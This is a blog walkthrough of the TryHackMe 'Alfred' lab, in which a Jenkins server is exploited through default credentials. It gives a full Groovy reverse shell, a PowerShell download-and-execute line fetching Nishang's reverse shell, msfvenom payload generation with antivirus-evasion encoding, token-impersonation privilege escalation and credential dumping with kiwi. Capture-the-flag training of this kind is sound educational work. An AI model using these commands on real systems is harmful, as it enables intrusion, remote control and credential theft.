---
id: 510
title: "Tryhackme Alfred - Walkthrough"
created: 2023-06-27T18:06:58+00:00
url: https://hacklido.com/blog/510-tryhackme-alfred-walkthrough
words: 1439
---

# Tryhackme Alfred - Walkthrough

[image]

This time on tryhackme we will be looking at another subscriber only windows room called alfred, named after personal assistant of batman.

We will be looking on how to exploit common misconfigurations on jenkins server. This is a windows box so it does not respond to the ping requests.

# Task 1.

## Questions

- How many ports are open? (TCP only)

Let’s quickly scan the machine using simple port scan and our intermediate scanning using rustscan. Also let’s save this into alfred.xml and then convert into html file for easy readability.

```
`rustscan -g -a 10.10.131.158
sudo rustscan  --ulimit 5000 -a 10.10.131.158 -- -A -Pn -sS --top-ports 1024 --script=vuln -oX Alfred.xml --reason --stats-every 5s
xsltproc Alfred.xml -O Alfred.html`
```

Now open your favorite web-browser and open the .html file so that you can get what’s on this machine.  https://hacklido.com/blog/496-attackerkb-source-tryhackme-walk-through#1-Discovering-the-lay-of-the-land--scanning-and-enumeration%5D-0 If something does not make any -sense in this scan kindly refer this url

The first command gives us the answer for the first question.

```
`3`
```

- What is the username and password for the login panel? (in the format username:password)

Let’s try some default password combination like admin password, admin admin, username password, etc. and we get `admin:admin` as the answer for our question.

- What is the user.txt flag?

There are two ways to to this one is the easy and the unofficial way and there is another method which is the intended way to pwn into the machine and we will be looking at both of them.

## Easy or the unofficial way.

For this just pull up groovy reverse shell from payload of all things, and past it into the console which is located at `/script`  directory on the website. Change the ip-address and port as per your specifications.

[image]

```
`String host=”your-tryhackme-ip-address";
int port=9000;
String cmd=”cmd.exe”;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`
```

Fire up your reverse shell and let this project build you will get reverse shell in within no time.

[image]

## Official or the hard way

For this we need to break our way into the machine. Navigate to the website in our case  http://10.10.131.158:8080/ http://10.10.131.158:8080/ and login with credentials `admin:admin` . Once we have logged in we after some search and navigation we find a user prompt that executes windows command under the '‘build section’' which is available in `/job/project/configure`. You can test simple commands like ‘whoami’ but we are more interested in gaining complete initial access to the system so that we can get user.txt

[image]

On your kali or parrot machine clone the nishang powershell scripts from the github [ https://github.com/samratashok/nishang https://github.com/samratashok/nishang] and go to that directory and launch simple python server so that we can access invoke-powershelltcp.ps1 file from our system to the victim machine.

```
`mkdir tools
cd tools
git clone https://github.com/samratashok/nishang/
cd nishang/Shells
python3 -m http.server`
```

[image]

[image]

Now on the jenkin’s server use the following command to get shell.

[image]

Now click on build now option and wait, if you have done everything correctly when you should see unfinished red progress bar and check your reverse shell .

```
`powershell iex (New-Object Net.WebClient).DownloadString('http://tryhackme-vpn-ip:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress yourtryhackme-vpn-ip -Port 9000`
```

Let’s break down the commands.

```
`powershell iex (New-Object Net.WebClient).DownloadString('http://tryhackme-vpn-ip:8000/Invoke-PowerShellTcp.ps1')````
```

This command downloads a file called as '‘Invoke-PowerShellTcp.ps1’' from our simple http server using powershell

```
`;Invoke-PowerShellTcp -Reverse -IPAddress yourtryhackme-vpn-ip -Port 9000`
```

`;` Command allows us to parallelly execute two commands at a time, allowing us to execute the downloaded nishang script with the parameters of -Reverse for reverse shell followed by two parameters, one for setting up an ip-address and another for port number.

Before executing this command make sure that you have netcat listening on port 9000.

```
`nc -nvlp 9000`
```

Now after gaining access, navigate to C:\Users\bruce\Desktop using `cd ..` to go back one folder and type in `dir` each step to notice what are the contents or directly change to this folder using this command.

```
`cd C:\Users\bruce\Desktop`
```

[image]

With this we get complete our task-1 and lets proceed to task 2.

# Task-2 Switching Shells

In second task, we will be creating an meterpreter payload using msfvenom and encode with an popular ‘shikata_ga_nai’ encoder to make it undetectable  by some anti-virus programs. Note that this was years ago and now many or most of the anti-virus programs may detect this encoding but this gets our task -2 completed.

Use the following command to create an meterpreter reverse shell using msfvenom.

```
`sfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=tun0 LPORT=1234 -f exe -o alfred.exe`
```

This gives us the answer for our question.

## Questions

- What is the final size of the exe payload that you generated?

[image]

Now before we proceed into the next task, we have to transfer this alfred.exe into the victim machine and then run this file with metasploit handler setup in background. Let’s do this task.

On your attack machine, again set up simple python http server to transfer the file.

```
`python3 -m http.server`
```

On the victim or tryhackme machine onto which you got reverse shell, use the following command to download the file.

```
`powershell iex "(New-Object System.Net.WebClient).Downloadfile('http://10.17.11.226:8000/alfred.exe','alfred.exe')"`
```

Now for this to be downloaded it’s better to do in C drive folder. Once it’s done check it’s content using `dir` command. Now after verification that the file was downloaded, use the following command to start the exe.file but before that make sure that you are running meterpreter handler configured correctly with lport, lhost and payload.

[image]

Once you have your mult/handler running go to the victim machine and type in following command to execute our metasploit reverse-shell named alfred.exe

```
`Start-Process "alfred.exe"`
```

And running this command should give you reverse shell, but notice that you are normal user.

# Task-3 Privilege Escalation

Now tryhackme tells us to escalate privileges, tryhackme recommends us to abuse or exloit access tokens, which sounds cool but there is faster easier and dumber ways to escalate privileges, among which migrating spoolsv process will directly give us privileged user.

For leet haxors you can refer the following links to know more about exploiting or abusing access tokens.

-  https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens

-  https://www.exploit-db.com/papers/42556 https://www.exploit-db.com/papers/42556

## Method 1 [access tokens]

```
`load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"`
```

You can verify that you have gained access using `getuid` if it returns `Server username: NT AUTHORITY\SYSTEM` then you have successfully escalated your privileges.

[image]

## Method 2 [migrating spoolsv ]

This is more classic and dumber ways to gain access, which is done on more beginner oriented boxes. For this list the running process using `ps aux` and then make a note of spoolsv process’s pid number. Use `migrate [pid of spoolsv]` to gain privileged access.

[image]

[image]

## Questions

Most of the questions don’t require answer and the questions that require answers are…

- Use the impersonate_token “BUILTIN\Administrators” command to impersonate the Administrators’ token. What is the output when you run the getuid command?

```
` NT AUTHORITY\SYSTEM`
```

- Read the root.txt file located at C:\ Windows\ System32\ config

Go or navigate to this folder, and read the content’s of the file.

[image]

# Bonus [post exploitation]

One can load kiwi module to dump all the credentials / password from the system.

```
`load_kiwi
creds_all`
```

[image]
